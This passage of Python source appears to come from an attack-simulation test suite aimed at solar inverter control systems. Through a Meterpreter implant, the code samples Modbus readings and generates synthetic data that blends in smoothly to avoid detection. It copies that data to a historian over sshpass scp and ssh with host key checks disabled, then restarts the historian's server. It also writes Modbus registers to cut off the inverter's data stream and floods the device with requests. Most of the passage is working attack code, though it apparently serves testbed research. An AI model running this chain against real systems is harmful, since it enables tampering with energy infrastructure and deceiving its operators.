                        return float(result_dict["values"][0])
                    else:
                        return float(result_dict["values"])

                elif "value" in result_dict:
                    # Handle single value
                    return float(result_dict["value"])

                elif "error" in result_dict:
                    # Error in result
                    logging.debug(
                        f"Modbus result contains error: {result_dict['error']}"
                    )
                    return None

            # Try direct numeric conversion
            return float(result_dict)

        except (ValueError, TypeError, KeyError) as e:
            logging.debug(f"Failed to parse Modbus result '{result_str}': {e}")
            return None

    def _extract_numeric_from_string(self, text: str) -> Optional[float]:
        """Extract numeric value from a text string as fallback parsing."""
        try:
            # Look for numeric patterns in the string
            numeric_patterns = [
                r"(\d+\.\d+)",  # Decimal numbers
                r"(\d+)",  # Integer numbers
                r"value[:\s]+(\d+\.?\d*)",  # "value: 123.45"
                r"(\d+\.?\d*)\s*$",  # Number at end of string
            ]

            for pattern in numeric_patterns:
                match = re.search(pattern, text)
                if match:
                    return float(match.group(1))

            return None

        except (ValueError, AttributeError):
            return None

    def _parse_modbus_batch_result(
        self, result_str: str, start_address: int, count: int
    ) -> Dict[int, float]:
        """Parse batch read results into address->value mapping."""
        try:
            result_dict = (
                json.loads(result_str) if isinstance(result_str, str) else result_str
            )

            if "values" in result_dict and isinstance(result_dict["values"], list):
                values = result_dict["values"]
                results = {}

                for i, value in enumerate(
                    values[:count]
                ):  # Ensure we don't exceed expected count
                    address = start_address + i
                    try:
                        results[address] = float(value)
                    except (ValueError, TypeError):
                        continue

                return results

        except Exception as e:
            logging.debug(f"Failed to parse batch result: {e}")

        return {}

    def _get_fallback_registers(self) -> Dict[str, Dict[str, int]]:
        """Get hardcoded fallback register mappings."""
        return {
            "DCA": {"address": 3000, "count": 1},  # DC Current A
            "DCV": {"address": 3001, "count": 1},  # DC Voltage
            "PhVphA": {"address": 3002, "count": 1},  # Phase Voltage A
            "AphA": {"address": 3003, "count": 1},  # Phase Current A
        }

    # ==========================================
    # 7. DATA SAMPLING & TRANSITION
    # ==========================================
    def _sample_inverter_data_via_implant(
        self, session: MeterpreterSession
    ) -> Dict[str, Any]:
        baseline_data = self.listen_and_capture_modbus_traffic(duration_seconds=10)

        # Extract the latest values from the captured data
        current_data = {}
        parameters = baseline_data.get("parameters", {})

        for address, param_info in parameters.items():
            # Map register addresses to parameter names
            param_name = self._map_address_to_parameter(address)
            if param_name:
                current_data[param_name] = param_info["latest_value"]

        logging.info(f"Sampled data: {current_data}")
        return current_data

    def _map_address_to_parameter(self, address: int) -> Optional[str]:
        """Map register address to parameter name."""
        address_mapping = {
            3000: "DCA",  # DC Current A
            3001: "DCV",  # DC Voltage
            3002: "PhVphA",  # AC Phase Voltage A
            3003: "AphA",  # AC Phase Current A
        }
        return address_mapping.get(address)

    def _generate_transition_data(
        self, baseline_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Generate smooth transition from real to synthetic data.
        """
        logging.info("Using centralized transition data generation from ModbusAttack")

        # Convert parameter-based data to address-based format for ModbusAttack
        address_based_data = self._convert_to_address_based_format(baseline_data)

        # Use the centralized enhanced method
        transition_plan = self.calculate_transition_plan(
            address_based_data, transition_duration=30
        )

        # Convert back to parameter-based format for compatibility
        return self._convert_to_parameter_based_format(transition_plan)

    def _convert_to_address_based_format(
        self, parameter_data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Convert parameter-based data format to address-based format for ModbusAttack.

        Args:
            parameter_data: Data with parameter names (DCA, DCV, PhVphA, AphA)

        Returns:
            Data formatted for ModbusAttack with address-based parameters
        """
        # Parameter to address mapping
        param_to_address = {
            "DCA": 3000,  # DC Current A
            "DCV": 3001,  # DC Voltage
            "PhVphA": 3002,  # AC Phase Voltage A
            "AphA": 3003,  # AC Phase Current A
        }

        # Create address-based format
        address_based: Dict[str, Any] = {
            "samples": [],
            "start_time": time.time(),
            "duration": 30,
            "parameters": {},
        }
        parameters_dict: Dict[int, Dict[str, Any]] = address_based["parameters"]

        # Convert each parameter to address-based format
        for param_name, value in parameter_data.items():
            if param_name in param_to_address:
                address = param_to_address[param_name]
                parameters_dict[address] = {
                    "mean": value,
                    "latest_value": value,
                    "parameter_type": self._get_parameter_type_from_name(param_name),
                    "min": value * 0.95,
                    "max": value * 1.05,
                    "variation": value * 0.05,
                    "sample_count": 1,
                }

        return address_based

    def _convert_to_parameter_based_format(
        self, transition_plan: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """
        Convert address-based transition plan back to parameter-based format.

        Args:
            transition_plan: Transition plan with address-based registers

        Returns:
            Transition plan with parameter names
        """
        # Address to parameter mapping
        address_to_param = {
            3000: "DCA",  # DC Current A
            3001: "DCV",  # DC Voltage
            3002: "PhVphA",  # AC Phase Voltage A
            3003: "AphA",  # AC Phase Current A
        }

        parameter_based_plan = []

        for point in transition_plan:
            param_point = {
                "timestamp": point.get("timestamp", time.time()),
                "quality": point.get("quality", "nominal"),
            }

            # Convert register values to parameter names
            registers = point.get("registers", {})
            for address, value in registers.items():
                if address in address_to_param:
                    param_name = address_to_param[address]
                    param_point[param_name] = value

            parameter_based_plan.append(param_point)

        return parameter_based_plan

    def _get_parameter_type_from_name(self, param_name: str) -> str:
        """Get parameter type classification from parameter name."""
        param_type_mapping = {
            "DCA": "current",  # DC Current A
            "DCV": "voltage",  # DC Voltage
            "PhVphA": "voltage",  # AC Phase Voltage A
            "AphA": "current",  # AC Phase Current A
        }
        return param_type_mapping.get(param_name, "unknown")

    def _generate_synthetic_point(
        self, baseline_data: Dict[str, Any], time_offset: int
    ) -> Dict[str, Any]:
        """Generate a single synthetic data point based on baseline with realistic variations."""
        synthetic_point = {}

        # Realistic parameter ranges and variations based on typical inverter behavior
        param_configs = {
            "DCA": {
                "base_noise": 0.02,  # ±2% noise
                "trend_amplitude": 0.1,  # ±10% slow trend
                "cycle_period": 300,  # 5-minute cycle
            },
            "DCV": {
                "base_noise": 0.005,  # ±0.5% noise (voltage more stable)
                "trend_amplitude": 0.03,  # ±3% slow trend
                "cycle_period": 600,  # 10-minute cycle
            },
            "PhVphA": {
                "base_noise": 0.01,  # ±1% noise
                "trend_amplitude": 0.05,  # ±5% slow trend
                "cycle_period": 180,  # 3-minute cycle
            },
            "AphA": {
                "base_noise": 0.03,  # ±3% noise (current more variable)
                "trend_amplitude": 0.15,  # ±15% slow trend
                "cycle_period": 240,  # 4-minute cycle
            },
        }

        for param, config in param_configs.items():
            baseline_val = baseline_data.get(param, 0)

            if baseline_val == 0:
                synthetic_point[param] = 0
                continue

            # Add realistic noise
            noise = random.gauss(0, config["base_noise"])

            # Add slow sinusoidal trend
            trend = config["trend_amplitude"] * math.sin(
                2 * math.pi * time_offset / config["cycle_period"]
            )

            # Add small random walk component for realism
            walk = random.gauss(0, config["base_noise"] * 0.5)

            # Combine components
            synthetic_val = baseline_val * (1 + noise + trend + walk)

            # Ensure realistic bounds (inverters have physical limits)
            if param == "DCV":
                synthetic_val = max(
                    200, min(800, synthetic_val)
                )  # Typical DC voltage range
            elif param == "DCA":
                synthetic_val = max(
                    0, min(50, synthetic_val)
                )  # Typical DC current range
            elif param == "PhVphA":
                synthetic_val = max(
                    100, min(300, synthetic_val)
                )  # Typical AC voltage range
            elif param == "AphA":
                synthetic_val = max(
                    0, min(30, synthetic_val)
                )  # Typical AC current range

            synthetic_point[param] = round(synthetic_val, 3)

        return synthetic_point

    def _transition_data_to_csv(self, transition_sequence: List[Dict[str, Any]]) -> str:
        """Convert transition data to CSV format matching the original data structure."""

        # CSV header matching the original inverter data format
        header = "datetimestamp,AphA,DCA,DCV,PhVphA,AphA_quality,DCA_quality,DCV_quality,PhVphA_quality,AphA_corrupted,AphA_corruption_encoding,DCA_corrupted,DCA_corruption_encoding,DCV_corrupted,DCV_corruption_encoding,PhVphA_corrupted,PhVphA_corruption_encoding,anomaly"

        csv_lines = [header]

        for point in transition_sequence:
            timestamp = time.strftime(
                "%Y-%m-%d %H:%M:%S", time.gmtime(point["timestamp"])
            )

            # Format the data row
            row = f"{timestamp},{point['AphA']},{point['DCA']},{point['DCV']},{point['PhVphA']},nominal,nominal,nominal,nominal,{point['AphA']},0.0,{point['DCA']},0.0,{point['DCV']},0.0,{point['PhVphA']},0.0,False"
            csv_lines.append(row)

        return "\n".join(csv_lines)

    def _deploy_transition_data(
        self, session: MeterpreterSession, transition_sequence: List[Dict[str, Any]]
    ) -> None:
        """Deploy transition data to the historian for smooth injection."""
        try:
            # Convert transition sequence to CSV format for the historian
            csv_content = self._transition_data_to_csv(transition_sequence)

            # Write transition data to a temporary file on the implant
            temp_file = "/tmp/transition_data.csv"

            # Create the CSV content via shell commands through meterpreter
            csv_lines = csv_content.split("\n")

            # Clear any existing file and write header
            self.send_msf_shell_command(f"echo '{csv_lines[0]}' > {temp_file}", session)

            # Append data lines
            for line in csv_lines[1:]:
                if line.strip():
                    escaped_line = line.replace("'", "'\"'\"'")
                    self.send_msf_shell_command(
                        f"echo '{escaped_line}' >> {temp_file}", session
                    )

            # Transfer to historian via SSH
            scp_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' scp -o StrictHostKeyChecking=no {temp_file} {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS}:{self.REMOTE_AGGREGATOR_DIR}/transition_data.csv"
            self.send_msf_shell_command(scp_cmd, session)

            # Update historian to use transition data
            switch_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'cd {self.REMOTE_AGGREGATOR_DIR} && pkill -f server.py && nohup python3 server.py transition_data.csv --frequency {STREAM_INTERVAL_MS} > /tmp/historian.log 2>&1 &'"
            self.send_msf_shell_command(switch_cmd, session)

            # Clean up temp file
            self.send_msf_shell_command(f"rm {temp_file}", session)

            logging.info("Transition data deployed to historian successfully")

        except Exception as e:
            logging.error(f"Failed to deploy transition data: {str(e)}")
            raise

    # ==========================================
    # 8. ATTACK EXECUTION
    # ==========================================
    def _bridge_data_discontinuity(self) -> None:
        """
        Bridge between real inverter data and synthetic data using the compromised implant.
        This creates a smooth transition to avoid detection discontinuities.
        """
        try:
            session = self._get_meterpreter_session()

            # Step 1: Sample current inverter data through the implant
            logging.info("Sampling current inverter data for baseline")
            current_data = self._sample_inverter_data_via_implant(session)

            # Step 2: Generate transition sequence locally on historian
            logging.info("Generating smooth transition sequence")
            transition_sequence = self._generate_transition_data(current_data)

            # Step 3: Upload transition data to historian for injection
            self._deploy_transition_data(session, transition_sequence)

            logging.info("Data bridge established successfully")

        except Exception as e:
            logging.error(f"Data bridging failed: {str(e)}")
            raise

    def _interrupt_data_stream(self) -> None:
        """
        Interrupt the original inverter data stream using discovered control registers.
        """
        try:
            session = self._get_meterpreter_session()

            # Discover control registers if not already done
            if not hasattr(self, "_discovered_controls"):
                self._discovered_controls = self._discover_control_registers(session)

            # Get best candidates for disable registers
            disable_candidates = self._select_best_disable_candidates(
                self._discovered_controls
            )

            if disable_candidates:
                logging.info(
                    f"Attempting to disable data stream using candidates: {disable_candidates}"
                )

                for address in disable_candidates:
                    disable_options: ModbusCommand = {
                        "OPTIONS": {
                            "RHOSTS": INVERTER_IP_ADDRESS,
                            "RPORT": ModbusConstants.DEFAULT_PORT,
                            "ACTION": "WRITE_SINGLE_REGISTER",
                            "DATA_ADDRESS": address,
                            "NUMBER": 1,
                            "DATA_REGISTERS": "0",  # Try to disable
                        }
                    }

                    result = self.execute_modbus_command(disable_options, session)
                    logging.info(f"Disable attempt on register {address}: {result}")

                    # Check if this had the desired effect
                    if self._verify_stream_interrupted(session):
                        logging.info(
                            f"Successfully interrupted stream using register {address}"
                        )
                        return

                    time.sleep(1)

            # Fallback to communication disruption if no suitable registers found
            logging.info(
                "No suitable disable registers found, attempting communication disruption"
            )
            self._disrupt_inverter_communications(session)

        except Exception as e:
            logging.error(f"Data stream interruption failed: {str(e)}")
            raise

    def _disrupt_inverter_communications(self, session: MeterpreterSession) -> None:
        """Disrupt inverter communications by flooding with requests."""

        flood_options: ModbusCommand = {
            "OPTIONS": {
                "RHOSTS": INVERTER_IP_ADDRESS,
                "RPORT": ModbusConstants.DEFAULT_PORT,
                "ACTION": "READ_REGISTERS",
                "DATA_ADDRESS": 0,
                "NUMBER": ModbusConstants.MAX_REGISTERS,
            }
        }

        # Send rapid requests to overwhelm the inverter's communication
        for i in range(100):
            try:
                self.execute_modbus_command(flood_options, session)
            except:
                pass  # Expected timeouts/errors
            time.sleep(0.01)  # Very rapid requests

    def _verify_stream_interrupted(self, session: MeterpreterSession) -> bool:
        """Verify if the original inverter data stream has been successfully interrupted."""
        try:
            # Try to read from inverter - if we get timeouts/errors, stream is likely interrupted
            test_options: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": INVERTER_IP_ADDRESS,
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "ACTION": "READ_INPUT_REGISTERS",
                    "DATA_ADDRESS": 3000,
                    "NUMBER": 1,
                }
            }

            # Attempt multiple reads to verify consistent interruption
            successful_reads = 0
            total_attempts = 5

            for _ in range(total_attempts):
                try:
                    result = self.execute_modbus_command(test_options, session)
                    if result and "error" not in result.lower():
                        successful_reads += 1
                    time.sleep(0.5)
                except:
                    pass  # Count as failed read

            # If most reads failed, stream is likely interrupted
            success_rate = successful_reads / total_attempts
            is_interrupted = success_rate < 0.3  # Less than 30% success = interrupted

            logging.info(
                f"Stream verification: {successful_reads}/{total_attempts} successful reads (interrupted: {is_interrupted})"
            )
            return is_interrupted

        except Exception as e:
            logging.error(f"Stream verification failed: {str(e)}")
            return False  # Assume not interrupted if we can't verify

    # ==========================================
    # 9. TEST METHODS
    # ==========================================
    def test_data_replay_attack(self) -> None:
        """
        Test a data replay attack where the compromised inverter connects to the
        aggregator and receives sensitive data, which can then be replayed to
        other systems to simulate legitimate traffic.
        """
        try:
            # Start the historian (server) on the aggregator system
            self._start_historian()

            self._bridge_data_discontinuity()

            # Start the injector (client) on the injector system to receive data
            self._start_injector(AGGREGATOR_IP_ADDRESS)

            self._interrupt_data_stream()

            # Verify data was exfiltrated by checking logs on the injector
            session = self.meterpreter_session
            log_check = self.send_msf_shell_command(
                f"cat {self.REMOTE_INJECTOR_DIR}/client.log 2>/dev/null || echo 'Log not found'",
                session,
            )

            self.assertIn("Received data point", log_check, "Failed to replay data")

        except Exception as e:
            logging.error(f"Data replay attack failed: {str(e)}")
            raise
        finally:
            logging.info("Data replay attack test completed")

    # ==========================================
    # 10. PROPERTY ACCESSORS
    # ==========================================
    @property
    def meterpreter_session(self) -> MeterpreterSession:
        """Get the meterpreter session from watering hole."""
        return self.watering_hole.meterpreter_session
